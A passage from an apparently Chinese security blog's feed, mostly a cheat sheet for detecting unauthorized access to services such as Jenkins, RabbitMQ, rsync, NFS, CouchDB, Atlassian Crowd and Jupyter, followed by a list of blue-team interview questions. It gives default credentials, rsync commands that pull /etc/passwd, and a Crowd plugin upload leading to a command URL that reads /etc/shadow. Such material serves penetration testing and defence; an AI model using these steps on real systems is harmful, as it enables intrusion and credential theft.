+<p><a href="http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy">http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy</a></p>
+<p><a href="http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login">http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login</a></p>
+<h3 id="10-jenkins未授权访问"><a href="#10-jenkins未授权访问" class="headerlink" title="10.jenkins未授权访问"></a>10.jenkins未授权访问</h3><blockquote>
+<p>默认端口8080</p>
+</blockquote>
+<p>检测方法</p>
+<p>先用 nmap 扫描查看端口开放情况看是否开放，</p>
+<p>然后直接访问：<a href="http://192.168.18.129:8080/manage">http://192.168.18.129:8080/manage</a></p>
+<h3 id="11-activeMQ未授权访问"><a href="#11-activeMQ未授权访问" class="headerlink" title="11.activeMQ未授权访问"></a>11.activeMQ未授权访问</h3><blockquote>
+<p>默认端口8161</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>先用 nmap 扫描查看端口开放情况看是否开放，</p>
+<p>ActiveMQ默认使用8161端口，默认用户名和密码是admin&#x2F;admin</p>
+<h3 id="12-rabbitMQ未授权访问漏洞"><a href="#12-rabbitMQ未授权访问漏洞" class="headerlink" title="12.rabbitMQ未授权访问漏洞"></a>12.rabbitMQ未授权访问漏洞</h3><p>漏洞验证</p>
+<p><a href="http://10.10.4.89:15672/">http://10.10.4.89:15672</a></p>
+<p><a href="http://10.10.4.89:25672/">http://10.10.4.89:25672/</a></p>
+<p><a href="http://10.10.4.89:15692/">http://10.10.4.89:15692/</a></p>
+<p>默认账号密码都是guest</p>
+<h3 id="13-sprintboot-actuator未授权访问"><a href="#13-sprintboot-actuator未授权访问" class="headerlink" title="13.sprintboot actuator未授权访问"></a>13.sprintboot actuator未授权访问</h3><p>漏洞特征，图标(绿叶子)和报错页面</p>
+<p>漏洞验证</p>
+<p>直接访问相关路径：</p>
+<p><a href="http://10.2.20.48/autoconfig">http://10.2.20.48:/autoconfig</a></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgclip_image002.png" alt="1625021874(1)"></p>
+<p>Spring Boot Actuator从未授权访问到getshell</p>
+<p><a href="https://blog.csdn.net/qq_38154820/article/details/106330264">https://blog.csdn.net/qq_38154820/article/details/106330264</a></p>
+<h3 id="14-FTP未授权访问漏洞（匿名登录）"><a href="#14-FTP未授权访问漏洞（匿名登录）" class="headerlink" title="14.FTP未授权访问漏洞（匿名登录）"></a>14.FTP未授权访问漏洞（匿名登录）</h3><p>漏洞验证</p>
+<p>直接访问ftp路径：<a href="ftp://ip:port/">ftp://ip:port/</a></p>
+<h3 id="15。jboss未授权访问"><a href="#15。jboss未授权访问" class="headerlink" title="15。jboss未授权访问"></a>15。jboss未授权访问</h3><p>漏洞特征：8080端口访问后左上角有jboss logo</p>
+<p>漏洞验证</p>
+<p>先用 nmap 扫描查看端口开放情况看是否开放 JBOSS 端口。再使用漏洞测试工具测试 jmx 组件存在情况通过访问 <a href="http://ip:jboss端口/">http://ip:jboss端口/</a> 看是否能进入 jmx-console 和 web-console 。</p>
+<h3 id="16-ldap未授权访问"><a href="#16-ldap未授权访问" class="headerlink" title="16.ldap未授权访问"></a>16.ldap未授权访问</h3><p>漏洞特征：phpldapadmin</p>
+<p><a href="https://www.cnblogs.com/Zh1z3ven/p/13894171.html">https://www.cnblogs.com/Zh1z3ven/p/13894171.html</a></p>
+<p>漏洞验证</p>
+<p>使用nmap寻找到相关的LDAP服务器，可以使用ldapbrowser直接连接，获取目录内容。</p>
+<h3 id="17-rsync未授权访问"><a href="#17-rsync未授权访问" class="headerlink" title="17.rsync未授权访问"></a>17.rsync未授权访问</h3><p>默认端口873</p>
+<p>漏洞验证：</p>
+<p>#rsync rsync:&#x2F;&#x2F;{target_ip}&#x2F;</p>
+<p>#rsync rsync:&#x2F;&#x2F;172.16.2.250:873&#x2F;</p>
+<p>#rsync rsync:&#x2F;&#x2F;172.16.2.250:873&#x2F;src</p>
+<p>利用rsync下载任意文件</p>
+<p>rsync rsync:&#x2F;&#x2F;172.16.2.250:873&#x2F;src&#x2F;etc&#x2F;passwd .&#x2F;</p>
+<h3 id="18：vnc未授权访问漏洞"><a href="#18：vnc未授权访问漏洞" class="headerlink" title="18：vnc未授权访问漏洞"></a>18：vnc未授权访问漏洞</h3><p>默认端口5900，5901</p>
+<p>漏洞验证</p>
+<p>vncviewer 192.168.15.8</p>
+<h3 id="19-dubbo未授权访问"><a href="#19-dubbo未授权访问" class="headerlink" title="19.dubbo未授权访问"></a>19.dubbo未授权访问</h3><p>无明显特征</p>
+<p>漏洞验证</p>
+<p>telnet ip port</p>
+<p>链接进入dubbo服务， 进行操作</p>
+<h3 id="20-nfs共享目录未授权访问"><a href="#20-nfs共享目录未授权访问" class="headerlink" title="20.nfs共享目录未授权访问"></a>20.nfs共享目录未授权访问</h3><p>默认端口2049,20048</p>
+<p>漏洞验证</p>
+<p>apt install nfs-common 安装nfs客户端</p>
+<p>showmount -e 192.168.70.162 查看nfs服务器上的共享目录</p>
+<p>mount -t nfs 192.168.70.162:&#x2F;grdata &#x2F;mnt 挂载到本地</p>
+<h3 id="21-druid未授权访问"><a href="#21-druid未授权访问" class="headerlink" title="21.druid未授权访问"></a>21.druid未授权访问</h3><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgclip_image002.jpg" alt="img"></p>
+<p>漏洞描述</p>
+<p>当开发者配置不当时就可能造成未授权访问下面给出常见Druid未授权访问路径</p>
+<p>&#x2F;druid&#x2F;websession.html</p>
+<p>&#x2F;system&#x2F;druid&#x2F;websession.html </p>
+<p>&#x2F;webpage&#x2F;system&#x2F;druid&#x2F;websession.html(jeecg)</p>
+<p>漏洞验证</p>
+<p>访问相关的路径：<a href="http://10.20.37.152:7001/BSCC/druid/index.html">http://10.20.37.152:7001/BSCC/druid/index.html</a></p>
+<h3 id="22-couchdb未授权访问漏洞"><a href="#22-couchdb未授权访问漏洞" class="headerlink" title="22.couchdb未授权访问漏洞"></a>22.couchdb未授权访问漏洞</h3><p>默认端口：5984</p>
+<p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务：</p>
+<p>curl <a href="http://192.168.18.129:5984/">http://192.168.18.129:5984</a></p>
+<p>curl <a href="http://192.168.18.129:5984/_config">http://192.168.18.129:5984/_config</a></p>
+<h3 id="23-atlassian-crowd未授权访问"><a href="#23-atlassian-crowd未授权访问" class="headerlink" title="23.atlassian crowd未授权访问"></a>23.atlassian crowd未授权访问</h3><p>漏洞特征：左上角atlassian的logo端口，默认端口8095</p>
+<p>漏洞验证</p>
+<p>进行上传一个标准的插件，来自atlassian-bundled-plugins中的applinks-plugin-5.4.12.jar</p>
+<p>curl –form “file_cdl&#x3D;@applinks-plugin-5.4.12.jar” <a href="http://192.168.18.138:8095/crowd/admin/uploadplugin.action">http://192.168.18.138:8095/crowd/admin/uploadplugin.action</a> -v</p>
+<p>访问地址并执行命令：<a href="http://10.10.20.166:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow">http://10.10.20.166:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow</a></p>
+<h3 id="24-jupyternotebook未授权访问"><a href="#24-jupyternotebook未授权访问" class="headerlink" title="24.jupyternotebook未授权访问"></a>24.jupyternotebook未授权访问</h3><p>漏洞特征：左上角有logo，jupyter</p>
+<p>漏洞验证</p>
+<p>利用nmap 扫描端口，获取到服务，访问地址：<a href="http://192.168.18.129:8888/">http://192.168.18.129:8888</a></p>
+<p>利用terminal命令执行：New &gt; Terminal 创建控制台</p>
+<p>可以执行任意命令</p>
+<h3 id="25-windows-ipc-共享未授权访问"><a href="#25-windows-ipc-共享未授权访问" class="headerlink" title="25,windows ipc 共享未授权访问"></a>25,windows ipc 共享未授权访问</h3><p>工具扫描，远程验证</p>
+<h3 id="26-rtsp未授权访问"><a href="#26-rtsp未授权访问" class="headerlink" title="26.rtsp未授权访问"></a>26.rtsp未授权访问</h3>]]></content>
+  </entry>
+  <entry>
+    <title>长亭蓝中面试</title>
+    <url>/2023/06/28/%E9%95%BF%E4%BA%AD%E9%9D%A2%E8%AF%95/</url>
+    <content><![CDATA[<p>自我介绍</p>
+<p>SQL注入的类型,  报错注入函数三个，主流防御sql注入的方式</p>
+<p>中间件漏洞讲一下，weblogic，log4j，shiro,fastjson特征   jndi的攻击复现过没有，具体的细节是什么<br>监控的时候怎么区分扫描器和真实攻击ip<br>护网的时候用过什么设备<br>内网了解吗，xxx工具用过没</p>
+<p>告警出现dns隐匿隧道，dns隐匿隧道如何区分，是不是误报  ，dns隧道和常规的dns解析有什么区别<br>ps：金融的一些内网流量可以dns解析出去，但是ping不通</p>
+<p>落地的wabshell怎么开展工作，排查工具有什么<br>怎么排查自启动项</p>
+<p>文件上传绕waf<br>溯源怎么溯<br>cs反制rce  （CVE-2022-39197,CVE-2022-23317,CVE-2021-36798)<br>内网的重点系统是什么，比如说集权之类的，域控算一个，还有什么</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
   </entry>
   <entry>
     <title></title>
